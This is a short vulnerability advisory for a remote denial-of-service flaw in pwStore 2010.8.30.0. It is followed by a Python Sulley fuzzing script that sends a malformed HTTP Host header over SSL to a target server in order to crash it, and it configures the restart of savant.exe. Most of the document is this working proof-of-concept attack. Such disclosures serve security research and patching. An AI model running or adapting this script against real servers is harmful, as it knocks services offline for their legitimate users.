source: http://www.securityfocus.com/bid/62112/info

pwStore is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to crash the application, denying service to legitimate users.

pwStore 2010.8.30.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/env python
from sulley import *
import sys
import time

s_initialize("HTTP")

s_static("GET / HTTP/1.1\r\n")
s_static("Host")
s_static(":\x0d\x0a")
s_static(" ")
s_string("192.168.1.39")
s_static("\r\n")
s_static("\r\n")

print "Instantiating session"
sess = sessions.session(session_filename="https_pwstore.session", proto="ssl", sleep_time=0.50)
print "Instantiating target"
target = sessions.target("192.168.1.39", 443)
#target.procmon = pedrpc.client("127.0.0.1", 26002)
#target.netmon = pedrpc.client("127.0.0.1", 26001)

target.procmon_options =  {
    "proc_name" : "savant.exe",
    "stop_commands" : ['wmic process where (name="savant.exe") delete"'],
    "start_commands" : ['C:\\savant\\savant.exe'],
}


print "Adding target"
sess.add_target(target)

print "Building graph"
sess.connect(s_get("HTTP"))

print "Starting fuzzing now"
sess.fuzz() 